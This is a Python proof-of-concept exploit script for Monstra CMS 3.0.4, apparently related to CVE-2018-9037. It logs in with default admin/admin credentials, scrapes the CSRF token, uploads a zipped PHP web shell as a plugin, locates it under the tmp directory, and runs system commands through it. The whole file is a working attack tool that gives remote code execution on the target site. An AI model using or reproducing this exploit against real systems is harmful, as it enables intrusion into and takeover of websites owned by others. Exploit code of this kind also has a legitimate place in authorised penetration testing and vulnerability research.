#!/usr/bin/env python
# monstrauuuu.py - postauth poc to upload shell in monstra cms 3.0.4
# similar to : CVE-2018-9037
#
import requests
import sys
import re

target = sys.argv[1]
sess = requests.session()
sesslink = target + '/monstra/admin/'

logmein = {
  'login':'admin',
  'password':'admin',
  'login_submit':'Log+In'
}

login_link = sesslink
doLogin = sess.post(login_link, data=logmein)
loginResp = doLogin.text

if '<title>Monstra :: Administration</title>' in loginResp:
  print '[+] the way I see IT, _we_ can do whatever we want'

  # grab csrf token to send with file
  tokenLink = target + '/monstra/admin/index.php?id=plugins'
  getToken = sess.get(tokenLink)
  gotTokenResp = getToken.text

  if 'csrf' in gotTokenResp:
    find_token = re.compile( 'name="csrf" value="(.*?)">' )
    found_token = re.search(find_token, gotTokenResp)

    if found_token:
      token = found_token.group(1)
      print '[+] CSRF grabbed, using %s' % ( token )

      # preparing upload file now
      fin = open('mishell.zip','rb')
      files = {'file': fin}

      shell_data = {
        'csrf':token,
        'file':files,
        'upload_file':'Upload',
      }

      req = sess.post(tokenLink, data=shell_data, files=files)
      #print req.text
      print '[+] high, is there Mishell?'

      tmp1 = target + '/monstra/tmp/'
      req1 = requests.get(tmp1)
      resp1 = req1.text

      find_plugDir = re.compile('<td><a href="plugin_(.*?)">')
      found_plugDir = re.search(find_plugDir, resp1)

      if found_plugDir:
        plugin_dir = '/plugin_' + found_plugDir.group(1)
        print '[+] meshell found in %s' % ( plugin_dir)

        print '[+] Verifying...'
        finLink = target + '/monstra/tmp/' + plugin_dir + '/mishell.php?xx=id;w;pwd'
        finish = requests.get(finLink)
        finish_resp = finish.text


        print '[+] shelling Monstraaaaaaaaaauuuuuuuuuuu! \o/ \n'
        print finish_resp

        print '\no/'


##
#

